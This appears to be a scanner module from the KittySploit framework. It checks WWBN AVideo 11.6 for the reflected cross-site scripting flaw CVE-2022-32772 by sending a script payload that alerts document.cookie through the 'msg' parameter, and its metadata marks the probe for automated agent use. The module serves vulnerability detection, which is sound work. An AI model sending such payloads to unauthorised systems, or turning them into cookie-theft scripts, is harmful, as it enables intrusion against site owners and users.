#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WWBN AVideo 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WWBN AVideo 11.6 - Cross-Site Scripting Detection',
        'description': "WWBN AVideo 11.6 contains a cross-site scripting vulnerability in the footer alerts functionality via the 'msg' parameter, which is inserted into the document with insufficient sanitization.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'avideo', 'xss', 'wwbn', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://talosintelligence.com/vulnerability_reports/TALOS-2022-1538',
            'https://github.com/WWBN/AVideo/blob/e04b1cd7062e16564157a82bae389eedd39fa088/updatedb/updateDb.v12.0.sql',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-32772',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-32772',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('avideoAlertInfo("</script><script>alert(document.cookie);</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WWBN AVideo 11.6 - Cross-Site Scripting detected",
                path='/index.php?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E',
            )
            return True
        return False

